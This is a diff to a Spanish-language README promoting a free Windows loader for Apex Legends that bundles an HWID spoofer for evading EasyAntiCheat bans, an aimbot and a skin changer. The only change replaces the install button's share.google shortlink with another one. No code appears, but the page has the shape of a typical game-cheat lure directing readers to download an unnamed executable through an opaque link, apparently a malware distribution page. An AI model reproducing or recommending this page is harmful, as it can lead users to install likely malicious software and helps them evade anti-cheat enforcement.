@@ -5,7 +5,7 @@
 **Apex Legends** — spoofer de HWID, aimbot y skin changer en un solo cargador para Windows. El spoofer reinicia el identificador de hardware que EAC bloqueó, el aimbot es totalmente configurable y el skin changer desbloquea cosméticos en tu cliente. **Descarga gratis, Windows 10 y 11.**
 
 <p align="center">
-  <a href="https://share.google/zocrPxsQIK81G4VUR"><img src="button.svg" alt="Iniciar instalación" height="46"></a>
+  <a href="https://share.google/3qfrs3ZPdHjLzcl4u"><img src="button.svg" alt="Iniciar instalación" height="46"></a>
 </p>
 
 ## ⚡ Inicio rápido
